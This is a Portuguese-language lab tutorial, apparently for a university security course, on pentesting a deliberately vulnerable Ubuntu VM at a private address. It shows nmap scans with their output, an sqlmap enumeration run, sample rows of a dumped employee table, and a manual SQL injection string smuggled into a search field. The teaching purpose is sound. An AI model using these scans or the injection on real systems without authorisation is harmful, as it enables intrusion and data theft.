# PenTest no host vítima ubuntu-server-utfpr-2021

Aqui iremos dar uma ideia em como realizar o PenTest utilizando uma Máquina Virtual (VM) chamada [ubuntu-server-utfpr-2021.ova](https://drive.google.com/file/d/1QExB3ftlKrnzPfkS1eIEKFSxK8pyoSaC/view?usp=sharing).

Basicamente vamos iniciar escaneando os serviços da vítima e depois explorando alguma vulnerabilidade encontrada.

## 1. Scanner de host e serviços com o Nmap

Primeiro vamos iniciar uma busca mais detalhadas a respeito do sistema operacional e serviços em execução no *host* vítima:

a) No primeiro *scan*, utilizando [Nmap](https://nmap.org/), foi realizada uma busca geral a respeito de serviços/versões em execução no *host* vítima, com o comando: ``nmap -A 192.168.56.108``. Nesse comando a opção ``-A`` já executa alguns *scripts* de vulnerabilidades. Veja a saída a seguir:

```console
# nmap -A 192.168.56.108
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-29 10:18 EDT
Nmap scan report for 192.168.56.108
Host is up (0.00035s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e4:9d:20:8f:d0:be:c7:9b:64:f8:7c:c3:64:c7:10:3a (RSA)
|   256 59:d8:b6:ef:50:d9:a7:74:69:f4:93:bb:29:42:71:b5 (ECDSA)
|_  256 67:f9:3b:ff:4b:2f:4d:60:2e:5e:f1:74:a8:2f:98:91 (ED25519)
23/tcp   open  telnet  Linux telnetd
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35566/udp6  mountd
|   100005  1,2,3      45506/udp   mountd
|   100005  1,2,3      52755/tcp   mountd
|   100005  1,2,3      60287/tcp6  mountd
|   100021  1,3,4      38519/udp   nlockmgr
|   100021  1,3,4      41301/tcp   nlockmgr
|   100021  1,3,4      46621/tcp6  nlockmgr
|   100021  1,3,4      48768/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 08:00:27:D8:C7:E8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.35 ms 192.168.56.108

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.49 seconds
```

Bem, com este *scan* é possível verificar que há serviços como: FTP, que possui acesso com usuário anonimo; há o TELNET; Apache HTTP; e o NFS. Lembrando que o FTP, TELNET e NFS são serviços que só por estarem em execução, já colocam em risco à segurança do *host*.

> E ai, o que deveria ser feito?

b) Além do *scan* anterior, vamos escanear também o *host* vítima em busca de vulnerabilidades cadastradas no [CVE](https://cve.mitre.org/). Todavia vamos fazer isso apenas utilizando a porta TCP/80, que é do Apache HTTP. Para isso vamos utilizar o comando ``nmap -sV --script vuln 192.168.56.108 -p 80``, veja a saída a seguir:

```console
# nmap -sV --script vuln 192.168.56.108 -p 80
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 06:33 EDT
Nmap scan report for 192.168.56.108
Host is up (0.00045s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 513.41 seconds
```

Com a saída anterior, é possível perceber que há algo relacionado ao [CVE2014-3704](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704). Tal vulnerabilidade diz respeito, dentre outras, a problemas com SQLInjection. Então, vamos tentar usar uma ferramenta de automática de analise de banco de dados (ver sessão a seguir).

> Note que há outros serviços que podem ser explorados. Então, tais serviços devem ser melhor analisados por um profissional realizando PenTest. O que você varia?


## 2. SQLInjection - ubuntu-server-utfpr-2021

### Ferramenta SQLMAP

Para conseguir mais facilmente informações a respeito de possíveis vulnerabilidades na falha apontada pela busca anterior ([CVE2014-3704](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704)), vamos executar o [SQLMAP](https://sqlmap.org). Para isso execute: ``sqlmap --wizard``, depois escolha o nível de dificuldade médio (``2 - Medium``) e faça uma enumeração todal (``3 - All``), tal como apresentado a seguir:

```console
$ sqlmap --wizard
...

[06:59:03] [INFO] starting wizard interface
Please enter full target URL (-u): http://192.168.56.108
POST data (--data) [Enter for None]:
[06:59:16] [WARNING] no GET and/or POST parameter(s) found for testing (e.g. GET parameter 'id' in 'http://www.site.com/vuln.php?id=1'). Will search for forms
Injection difficulty (--level/--risk). Please choose:
[1] Normal (default)
[2] Medium
[3] Hard
> 2
Enumeration (--banner/--current-user/etc). Please choose:
[1] Basic (default)
[2] Intermediate
[3] All
> 3

sqlmap is running, please wait..

```


Bem, a analise da saída do SQLMAP, apresentará grandes problemas no que se refere ao banco de dados. Todavia, ainda vamos testar se funciona uma injeção SQL simples, o que também representa grande risco ao sistema e aos dados do banco de dados.

> Não vou apresentar a saída aqui, faça o teste e veja o que você acha... Quais são os problemas?

### SQLInjection manual - teste

A página Web disponível disponível no host vítima, tem uma campo para consultar o nome de pessoas/empregados. Essa busca é realizada pelo primeiro nome da pessoa. Então vamos tentar filtrar pelo primeiro e último nome.

Note que a saída do SQLMAP anterior, apresenta a estrutura da tabela da consulta em questão, que é a saída a seguir:

```console
Database: employees
Table: employees
[300025 entries]<enter>
+--------+--------+------------+------------------+------------+----------------+
| emp_no | gender | hire_date  | last_name        | birth_date | first_name     |<enter>+--------+--------+------------+------------------+------------+----------------+
| 499744 | F      | 1989-10-30 | Anandan          | 1959-12-16 | Kshitij        |
| 499745 | M      | 1992-02-29 | Isard            | 1957-05-17 | Radhika        |
| 499746 | M      | 1990-07-03 | Driscoll         | 1957-10-09 | Kiyotoshi
...
```

Então, dada e estrutura da tabela do banco de dados, é só utilizar essa saída para incrementar a busca.
Por exemplo, deve ter sido implementado um ``SELECT``, pesquisando por um campo utilizando o ``LIKE``. Assim, podemos tentar continuar o comando e se o resultado estiver correto, isso deve trazer apenas o nome de um dos Elvis no sistema e não de todos.

```console
elvis%' and last_name LIKE 'Pfau
```

Isso irá fazer com que o SQL filtre a busca pelo usuário ``Elvis`` com o sobrenome ``Pfau``, o que significa que o sistema aceita SQL e desta forma o sistema pode sofrer com ataques de SQLInjection.

> Tem que utilizar um pouco de imaginação - como deve ter sido implementada a busca na página?


## 3. Conclusão

Esse pequeno teste já demonstra que é possível explorar o *host* com SQLInjection. Todavia, há vários outros serviços que não testamos ainda, então tente utilizar outras técnicas/ferramentas para ver o que mais pode ser explorado, e principalmente o que pode ser corrigido neste *host*.

## 4. Referências

* <https://nmap.org/>

* <https://nmap.org/nsedoc/scripts/http-vuln-cve2014-3704.html>

* <https://securitytrails.com/blog/nmap-vulnerability-scan>
